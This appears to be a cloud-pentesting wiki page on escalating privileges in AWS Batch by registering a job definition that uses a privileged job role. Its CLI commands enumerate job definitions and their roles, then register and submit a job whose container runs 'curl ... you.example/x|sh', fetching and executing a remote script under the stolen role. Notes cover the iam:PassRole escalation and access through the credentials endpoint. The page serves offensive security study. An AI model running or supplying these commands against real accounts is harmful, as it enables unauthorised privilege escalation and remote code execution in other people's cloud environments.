---
title: "Batch: job definitions running under a job role"
description: "Abusing AWS Batch job definitions and compute environments to run containers under a privileged job role."
keywords:
  - Batch
  - job definition
  - compute environment
  - job role
  - container
---

# Batch

AWS Batch runs containerized jobs on ECS or Fargate compute environments. A **job definition** sets the image, command, and a **job role**, so registering or editing a definition and submitting a job runs your container under that role, much like ECS tasks.

## Running a job

```bash
aws batch describe-job-definitions --status ACTIVE \
  --query 'jobDefinitions[].{n:jobDefinitionName,role:containerProperties.jobRoleArn}'

aws batch register-job-definition --job-definition-name x --type container \
  --container-properties '{"image":"<you>/img","command":["sh","-c","curl -s https://you.example/x|sh"],"jobRoleArn":"<privileged-role>","vcpus":1,"memory":512}'
aws batch submit-job --job-name x --job-queue <queue> --job-definition x
```

## Exploitation notes

- Setting `jobRoleArn` to a role more privileged than the caller needs `iam:PassRole`, making this an escalation path.
- The container reaches its role through the ECS task-credentials endpoint, as in [containers](containers.md).
- An existing queue and compute environment are enough; you do not need to provision infrastructure, only a definition and a submit.

## Tools

- **AWS CLI** (`batch register-job-definition`, `submit-job`).

## References

- [AWS: Batch IAM job roles](https://docs.aws.amazon.com/batch/latest/userguide/execution-IAM-role.html)
- [HackTricks Cloud: AWS services](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
